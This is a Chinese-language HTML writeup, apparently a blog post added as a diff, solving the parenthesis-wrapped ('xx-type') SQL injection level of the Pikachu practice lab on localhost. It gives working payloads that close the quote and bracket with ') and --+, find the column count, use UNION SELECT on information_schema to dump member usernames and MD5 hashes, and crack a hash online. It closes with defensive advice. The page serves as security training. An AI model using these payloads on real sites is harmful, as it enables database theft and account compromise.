@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【Pikachu】Web-SQL-Inject xx型注入 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+        .diff-box { background-color: #f1f8ff; border-left: 4px solid #0366d6; padding: 10px 15px; margin: 15px 0; border-radius: 4px; }
+        .payload-box { background-color: #fafbfc; border: 1px solid #e1e4e8; padding: 10px; border-radius: 6px; margin: 10px 0; }
+        .payload-box p { margin: 5px 0; }
+        .step-box { margin-bottom: 20px; padding: 15px; border: 1px solid #e1e4e8; border-radius: 6px; background-color: #fff; }
+        .step-box h3 { margin-top: 0; color: #24292e; font-size: 1.1em; border-bottom: 1px solid #eaecef; padding-bottom: 5px; }
+        .info-line { margin: 5px 0; }
+        .info-label { font-weight: bold; color: #586069; }
+        .code-block { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow-x: auto; }
+        .code-comment { color: #6a737d; }
+        .code-keyword { color: #d73a49; }
+        .code-string { color: #032f62; }
+        .code-function { color: #6f42c1; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【Pikachu】Web-SQL-Inject xx型注入 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.9.27 | <strong>分类：</strong>Pikachu | <strong>标签：</strong>Pikachu, Web, SQL注入, xx型注入, 括号闭合, GET注入, union select, cmd5</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>Pikachu 漏洞练习平台</li>
+        <li><strong>分类：</strong>Web - SQL-Inject</li>
+        <li><strong>题目名称：</strong>xx型注入</li>
+        <li><strong>目标：</strong>利用GET请求中因括号闭合不当造成的SQL注入漏洞，构造包含单引号和右括号的Payload，获取数据库中的管理员账号和密码。</li>
+    </ul>
+
+    <h2>2. 解题思路与知识点</h2>
+    <p><strong>漏洞原理：</strong></p>
+    <p>xx型注入本质上是字符型注入的一种特殊变形。后端程序在处理查询参数时，不仅使用单引号包裹变量，还使用了括号将变量括起来，SQL 语句类似于 <code>SELECT * FROM users WHERE username = ('$name')</code>。攻击者在构造 Payload 时，必须同时闭合前面的单引号（<code>'</code>）和右括号（<code>)</code>），然后使用注释符（如 <code>--+</code>）注释掉后面的右括号和单引号，才能使注入的逻辑控制生效。</p>
+    
+    <div class="diff-box">
+        <strong>工具选型与心路历程：</strong>
+        <ul>
+            <li><strong>F12抓包与地址栏注入：</strong>通过F12抓包明确请求方式为GET，参数名为 <code>name</code>。由于是GET请求，直接在浏览器地址栏手工构造URL进行注入测试最为直观高效。</li>
+            <li><strong>闭合技巧（')）：</strong>常规的字符型注入闭合使用 <code>vince'</code>，但本关报错信息为 <code>near ''vince'')' at line 1</code>，揭示出后端有括号。必须使用 <code>vince')</code> 来同时闭合单引号和右括号，并配合 <code>--+</code> 截断后续语句。</li>
+            <li><strong>联合查询提取数据：</strong>利用 <code>UNION SELECT</code> 结合 <code>information_schema</code> 元数据库，逐层获取库名、表名、列名，最终提取账号与密码哈希。</li>
+            <li><strong>MD5解密：</strong>获取到MD5哈希后，利用cmd5.com在线网站进行反向查询，还原明文密码。</li>
+        </ul>
+    </div>
+
+    <h2>3. 操作步骤</h2>
+    
+    <div class="step-box">
+        <h3>第一步：抓包与参数分析</h3>
+        <p class="info-line"><span class="info-label">操作：</span>在页面输入框输入 <code>vince</code>，点击“查询”。按F12打开开发者工具，切换到网络（Network）标签页，观察抓到的请求。</p>
+        <p class="info-line"><span class="info-label">分析结果：</span>URL为 <code>http://127.0.0.1/pikachu/vul/sqli/sqli_x.php?name=vince&submit=查询</code>。确认请求方式为GET，参数名为 <code>name</code>。</p>
+    </div>
+
+    <div class="step-box">
+        <h3>第二步：漏洞探测（单引号与括号闭合测试）</h3>
+        <p class="info-line"><span class="info-label">1. 单引号测试：</span>在地址栏输入 <code>name=vince'</code> 访问。</p>
+        <div class="payload-box">
+            <p><strong>回显：</strong>页面抛出数据库报错：<code>You have an error in your SQL syntax; check the manual... near ''vince'')' at line 1</code>。</p>
+            <p><strong>说明：</strong>报错信息中的 <code>near ''vince'')'</code> 证实了后端SQL语句形如 <code>WHERE username = ('$name')</code>，且单引号未被过滤。必须同时闭合单引号和括号。</p>
+        </div>
+        <p class="info-line"><span class="info-label">2. 布尔逻辑测试（使用 <code>')</code> 闭合）：</span></p>
+        <div class="payload-box">
+            <p><strong>测试真条件：</strong> <code>?name=vince') and 1=1 --+&submit=查询</code></p>
+            <p><strong>回显：</strong>页面正常显示 `vince` 的账号信息（`uid:1`, `email: hacker@hacked.com`）。</p>
+            <p><strong>测试假条件：</strong> <code>?name=vince') and 1=2 --+&submit=查询</code></p>
+            <p><strong>回显：</strong>页面提示“您输入的username不存在，请重新输入！”。</p>
+            <p><strong>说明：</strong>证明 <code>')</code> 成功闭合了前端的单引号和括号，且逻辑控制生效，漏洞存在。</p>
+        </div>
+    </div>
+
+    <div class="step-box">
+        <h3>第三步：探测字段数（ORDER BY）</h3>
+        <p class="info-line"><span class="info-label">操作：</span>在地址栏依次测试 <code>order by</code> 递增数字：</p>
+        <div class="payload-box">
+            <p><strong>输入：</strong> <code>?name=vince') order by 2 --+&submit=查询</code></p>
+            <p><strong>回显：</strong>页面正常显示 `vince` 的信息。</p>
+            <p><strong>输入：</strong> <code>?name=vince') order by 3 --+&submit=查询</code></p>
+            <p><strong>回显：</strong>页面报错 <code>Unknown column '3' in 'order clause'</code>。</p>
+            <p><strong>说明：</strong>推断后端SQL语句查询了 <strong>2</strong> 个字段。</p>
+        </div>
+    </div>
+
+    <div class="step-box">
+        <h3>第四步：联合查询获取数据（UNION SELECT）</h3>
+        <p class="info-line"><span class="info-label">操作：</span>利用联合查询，逐步获取库名、表名、列名及账号密码。</p>
+        
+        <p class="info-line"><span class="info-label">1. 确认回显位置：</span></p>
+        <div class="payload-box">
+            <p><strong>输入：</strong> <code>?name=vince') union select 1,2 --+&submit=查询</code></p>
+            <p><strong>回显：</strong>页面显示 `vince` 的信息以及第二组注入结果 `uid: 1` / `email is: 2`。确定第 2 个字段（对应 email 位置）为回显点。</p>
+        </div>
+
+        <p class="info-line"><span class="info-label">2. 查库名：</span></p>
+        <div class="payload-box">
+            <p><strong>输入：</strong> <code>?name=vince') union select 1,database() --+&submit=查询</code></p>
+            <p><strong>回显：</strong> <code>email is: pikachu</code>，库名为 <code>pikachu</code>。</p>
+        </div>
+
+        <p class="info-line"><span class="info-label">3. 查表名：</span></p>
+        <div class="payload-box">
+            <p><strong>输入：</strong> <code>?name=vince') union select 1,group_concat(table_name) from information_schema.tables where table_schema='pikachu' --+&submit=查询</code></p>
+            <p><strong>回显：</strong> <code>email is: httpinfo,member,message,users,xssblind</code>。锁定目标表为 <code>member</code>。</p>
+        </div>
+
+        <p class="info-line"><span class="info-label">4. 查列名：</span></p>
+        <div class="payload-box">
+            <p><strong>输入：</strong> <code>?name=vince') union select 1,group_concat(column_name) from information_schema.columns where table_name='member' and table_schema='pikachu' --+&submit=查询</code></p>
+            <p><strong>回显：</strong> <code>email is: id,username,pw,sex,phonenum,address,email</code>。确认账号和密码字段为 <code>username</code> 和 <code>pw</code>。</p>
+        </div>
+
+        <p class="info-line"><span class="info-label">5. 爆账号密码：</span></p>
+        <div class="payload-box">
+            <p><strong>输入：</strong> <code>?name=vince') union select 1,group_concat(concat(username, ':', pw)) from member --+&submit=查询</code></p>
+            <p><strong>回显：</strong> <code>email is: vince:e10adc3949ba59abbe56e057f20f883e,allen:e10adc3949ba59abbe56e057f20f883e,...</code>，成功获取所有账号及其对应的MD5密码哈希值。</p>
+        </div>
+    </div>
+
+    <div class="step-box">
+        <h3>第五步：解密与验证</h3>
+        <p class="info-line"><span class="info-label">操作：</span> 将提取到的哈希值 <code>e10adc3949ba59abbe56e057f20f883e</code> 粘贴到 cmd5.com 进行查询。</p>
+        <p class="info-line"><span class="info-label">回显：</span> 查询结果显示明文密码为 <code>123456</code>。</p>
+        <p class="info-line"><span class="info-label">说明：</span>证明后端使用了 MD5 加密且未加盐，且用户使用了极弱口令。</p>
+    </div>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>坑1：xx型注入特有的闭合方式（括号）。</strong>直接用 <code>vince'</code> 会导致 SQL 语法错误（缺少右括号闭合）。必须使用 <code>vince')</code> 才能同时闭合单引号和右括号，并保留注释符 <code>--+</code> 来截断后面的 <code>')</code>。</li>
+        <li><strong>坑2：URL 自动编码。</strong>在浏览器地址栏直接输入 Payload 时，空格、单引号、括号等字符会被浏览器自动编码（如 <code>%27</code>、<code>%20</code>、<code>%29</code>）。这是正常现象，后端 PHP 会自动解码，但应确保注释符 <code>--+</code> 被完整输入。</li>
+        <li><strong>坑3：字段数与前两关不同。</strong>该关卡后端查询了 <code>member</code> 表的部分字段，因此推断出的字段数为 2，而搜索型注入关卡字段数为 3，需要根据实际情况调整 <code>UNION SELECT</code> 的占位符数量。</li>
+    </ul>
+
+    <h2>5. 知识总结</h2>
+    <ul>
+        <li><strong>xx型注入核心：</strong>后端变量被单引号和括号包裹时，Payload必须包含单引号和右括号（如 <code>')</code>）来闭合，并使用注释符截断后续语句。</li>
+        <li><strong>UNION 联合查询：</strong>在知道字段数后，利用 <code>UNION SELECT</code> 结合 <code>information_schema</code> 数据库，按照“库 -> 表 -> 列 -> 数据”的顺序逐层提取，实现完整的“脱库”攻击。</li>
+        <li><strong>防御建议：</strong>严格使用预编译语句（Prepared Statements）或参数化查询，确保参数与SQL语句代码分离；对用户输入进行严格的过滤和转义；对密码使用加盐的强哈希算法（如 bcrypt）进行存储。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
